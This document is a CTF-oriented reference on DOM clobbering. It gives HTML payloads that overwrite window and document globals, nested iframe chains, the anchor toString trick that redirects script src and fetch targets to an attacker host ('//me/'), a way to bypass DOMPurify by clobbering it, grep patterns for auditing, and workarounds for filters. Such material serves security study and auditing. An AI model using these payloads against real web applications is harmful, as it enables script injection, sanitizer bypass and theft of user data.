# DOM clobbering — deep reference

DOM clobbering: `id`/`name` attributes on injected HTML elements
create properties on `window` and `document`. If app code reads a
global that you clobbered, you control what it sees — config,
sanitizer allowlists, URLs it navigates to, code it evals.

---

## 1. What clobbers what

```html
<!-- window.X / document.X: -->
<a id=x href="javascript:alert(1)">      → window.x = <a> element
<iframe name=x src=y>                    → window.x = Window object!
<img id=x name=y>                        → x.y = "y" (name prop)
<form id=x><input name=y value=z>        → x.y = <input>, x.y.value = "z"
<form id=x><input name=y><input name=z>  → x.y, x.z = inputs
<embed name=x>                           → window.x
<object name=x>                          → window.x
```

Two identical names → `HTMLCollection` (array-like), `x.length`
works but `x.y` doesn't:

```html
<a id=x name=y><a id=x name=y>      → x = HTMLCollection(2)
```

Form elements are special — named children attach to the form:

```html
<form id=f><input name=a><input name=b></form>
→ f.a, f.b = inputs; f.a.value = their values
```

---

## 2. Three-level clobbering — needs iframes

```html
<iframe name=a srcdoc='
  <iframe name=b srcdoc="..."></iframe>
'></iframe>
→ window.a.b = inner Window — third level via nested srcdoc
```

Or anchor chains: `a.b.c` where `b` is a named element inside a's
document (iframe srcdoc).

---

## 3. What to clobber — the targets

```javascript
// 1. Config objects the app checks:
if (window.config && config.isAdmin) → clobber config.isAdmin truthy

// 2. URLs the app navigates to:
location = config.apiUrl      → clobber config.apiUrl = '//me/'
fetch(ENDPOINT)               → clobber ENDPOINT global

// 3. Function references the app calls:
callback = window.callback    → clobber with <a id=callback
                                 href="javascript:..."> — .href! not call
// functions can't be clobbered with code directly — but PROPERTIES
// consumed by code can:
script.src = cdn.base + 'lib.js'  → <a id=cdn name=base
                                      href="//me/"> → base = anchor

// 4. Sanitizer allowlists:
if (DOMPurify.isSupported) → clobber DOMPurify = something falsy
   → app falls back to no-sanitize path
```

---

## 4. The `toString` trick — clobbered elements stringify

```javascript
// when the app stringifies the clobbered value:
config.apiUrl + '/flag'
// <a id=apiUrl href="//me/"> → String(anchor) = its href!
// → "//me//flag" — the anchor's toString is its href
```

`<a href>` clobber is powerful because `String(anchor) === href` —
any code doing `X + "/path"` gets your URL.

---

## 5. Prototype-pollution adjacency — `__proto__` names

```html
<a id="__proto__">        → does NOT clobber prototype (name is
                            own-prop on window, proto lookup skips)
```

DOM clobbering ≠ prototype pollution — separate class
(`web-prototype-pollution`).

---

## 6. The audit pattern — finding clobberable code

```javascript
// grep for globals that should be objects:
window.X.            -- X clobberable if unset before read
X.prop                -- bare global reads
document.getElementById('x').value   -- ID collision: your <input id=x>
                                       replaces their expected el
typeof X !== 'undefined' && X.y      -- clobber X to pass the check
```

The dangerous pattern: `window.SOMETHING.foo` where SOMETHING is
expected to be an object set by a script — if the script tag fails
to load or runs late, your injected `<a id=SOMETHING>` wins.

---

## 7. Filtered `id`/`name` — workaround

```html
<form name=x>             -- name works where id filtered
<map name=x>              -- also named
<applet name=x>           -- legacy named
```

---

## 8. CTF relevance

DOM clobbering is rarely the PRIMARY challenge bug but often the
second hop: app loads config from a JSON script tag or global var —
clobber the var name → app uses your value → navigation/src/
function-arg → exec. Worth grepping for `window.` + `.` property
reads in the bundle when a plain XSS path is sanitized.
